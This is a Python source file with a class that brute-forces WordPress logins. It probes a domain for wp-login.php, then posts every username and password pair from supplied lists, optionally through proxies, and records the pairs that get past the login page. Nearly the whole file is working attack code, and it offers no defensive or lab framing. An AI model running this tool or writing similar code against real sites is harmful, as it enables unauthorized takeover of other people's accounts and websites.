import socket
import requests

from httpsrequesthandler import HTTPRequestHandler


class WpLoginPhpBruteforcer(object):

    def __init__(self, domain, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain: String. domain.
        :param proxies: working via HTTP proxies
        """
        self._https = None
        self._listOfPasswords = dict()
        self._domain = domain
        self._proxies = proxies

    def bruteforce(self, usernames, passwords, retries=0, timeout=5):
        """
        this functhon run the run_bruteforce over wp-login.php url.
        :param usernames:list. list of usernames we want t 0 brutforce.
        :param passwords:list. list of passwords to perform the bruteforce.
        :param retries: The number of tries that each HTTP request will be sent until it will succeed
        :param timeout: How much time each HTTP request will wait for an answer
        :return: dict. dict of passwords and usernames who succesfully bruteforce via wp-login.php.
        """
        try:
            '''figure out if this site is http or https'''
            r = HTTPRequestHandler().send_http_request(method='get', url='http://' + str(self._domain))
            url = r.url
            complete_url = url + '/wp-login.php'
            for u in usernames:
                for p in passwords:
                    try:
                        payload = {'log': u, 'pwd': p}
                        http_handler = HTTPRequestHandler(proxies=self._proxies, retries=retries, timeout=timeout,
                                                          payload=payload)
                        r = http_handler.send_http_request(method='post', url=complete_url)
                        if 'wp-login' not in str(r.url):
                            self._listOfPasswords[u+p] = (u, p)
                    except Exception as e:
                        print(e)
                        continue
            return self._listOfPasswords
        except:
            print("error in executing function: 'bruteforce' in httpsBruteforcer")

    def is_method_possible(self):
        """
        check whether the bruteforce via wp-login.php is possible for the domain or not
        :return:boolean. Returns whether the bruteforce via wp-login.php is possible for the domain or not
        """
        try:
            url = 'http://' + str(self._domain)+'/wp-login.php'
            r = HTTPRequestHandler().send_http_request(method='get', url=url)
            if '404 Page Not Found' in r.text or str(r.status_code) != '200':
                return False
            else:
                return True
        except Exception as e:
            print(e)
